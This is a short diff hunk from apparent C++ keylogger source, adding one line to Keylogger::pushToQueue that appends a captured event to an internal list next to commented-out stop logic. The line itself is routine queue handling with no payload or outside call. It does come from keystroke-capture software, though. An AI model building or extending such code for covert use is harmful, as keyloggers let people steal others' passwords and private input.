@@ -98,6 +98,7 @@ bool Keylogger::pushToQueue(const AEvent* event) {
 	//		this->stop();
 	//	}
 	//}
+	this->_levents.add_elem((void*)event);
 	return true;
 }
 
